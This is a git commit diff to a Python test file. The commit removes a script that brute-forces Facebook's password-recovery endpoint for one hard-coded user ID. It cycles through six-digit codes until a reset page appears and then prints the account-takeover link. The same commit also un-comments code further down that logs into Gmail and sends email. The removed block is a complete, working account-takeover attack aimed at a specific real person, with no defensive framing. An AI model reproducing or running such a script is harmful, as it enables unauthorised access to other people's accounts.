f5226ca6ee2370baf80afa2cfa943b852fdf5dea
krarktel112 <krarktel@gmail.com>
2025-03-03 17:18:36 -0500

    Update Test.py

--- Test.py
+++ Test.py
@@ -19,88 +19,8 @@ from selenium import webdriver
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
               'Chrome/7.0.517.41 Safari/534.7' 
-import signal
 
 
-def signal_handler(sig, frame):
-    print('You pressed Ctrl+C!')
-    sys.exit(0)
-
-class GracefulInterruptHandler(object):
-
-    def __init__(self, sig=signal.SIGINT):
-        self.sig = sig
-
-    def __enter__(self):
-
-        self.interrupted = False
-        self.released = False
-
-        self.original_handler = signal.getsignal(self.sig)
-
-        def handler(signum, frame):
-            self.release()
-            self.interrupted = True
-
-        signal.signal(self.sig, handler)
-
-        return self
-
-    def __exit__(self, type, value, tb):
-        self.release()
-
-    def release(self):
-
-        if self.released:
-            return False
-
-        signal.signal(self.sig, self.original_handler)
-
-        self.released = True
-
-        return True
-
-i = 0
-
-array = [0,0,0,0,0,0,0,0]
-chars = "0123456789"
-user_id = "100001223312778"
-lock = False
-
-with GracefulInterruptHandler() as h:
-    for i in range(1000000):
-        password = ""
-
-        i+=1
-        if i % 10000 == 0:
-            print(f'{i / 10000} / 100')
-
-        for j in range(6):
-            password += chars[array[j]]
-
-        for j in range(8):
-            array[j] += 1
-            if array[j] >= 10:
-                array[j] = 0
-                break
-
-        try:
-            x = requests.get(f'https://www.facebook.com/recover/password/?u={user_id}&n={password}')
-        except:
-            if not lock:
-                i-=1
-                lock = True
-            continue
-        lock = False
-        if 'password_new' in x.text:
-            print(f'connect to https://www.facebook.com/recover/password/?u={user_id}&n={password}')
-            sys.exit()
-
-        if h.interrupted:
-            break
-
-
-"""
 def sleepy(counter):
   x = counter
   y = 0
@@ -252,4 +172,4 @@ context = ssl.create_default_context()
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.login(sender_email, password)
     server.sendmail(sender_email, receiver_email, text)
-"""
+
